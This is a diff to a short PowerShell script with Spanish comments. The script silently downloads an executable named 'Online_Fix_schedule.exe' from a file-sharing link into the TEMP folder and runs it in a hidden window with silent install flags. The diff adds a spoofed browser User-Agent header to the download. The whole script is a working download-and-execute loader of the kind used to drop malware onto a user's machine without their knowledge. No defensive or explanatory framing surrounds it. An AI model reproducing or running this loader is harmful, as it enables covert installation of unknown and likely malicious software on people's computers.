@@ -1,14 +1,19 @@
-# Ruta temporal donde guardar el archivo
+# Ruta temporal
 $tempPath = "$env:TEMP\Online_Fix_schedule.exe"
 
-# URL del archivo a descargar
+# URL del .exe (verifica que funcione)
 $url = "https://store10.gofile.io/download/web/eac7e870-f22a-4062-9a8c-194acd0c58b3/Online_Fix_schedule.exe"
 
-# Descarga silenciosa
-Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
+# Headers para simular navegador
+$headers = @{
+    "User-Agent" = "Mozilla/5.0"
+}
 
-# Esperar un momento por seguridad
+# Descargar con headers
+Invoke-WebRequest -Uri $url -OutFile $tempPath -Headers $headers -UseBasicParsing
+
+# Esperar un poco
 Start-Sleep -Seconds 2
 
-# Ejecutar el archivo descargado en modo silencioso (si el instalador lo soporta)
+# Ejecutar
 Start-Process -FilePath $tempPath -ArgumentList "/silent", "/verysilent", "/norestart" -WindowStyle Hidden
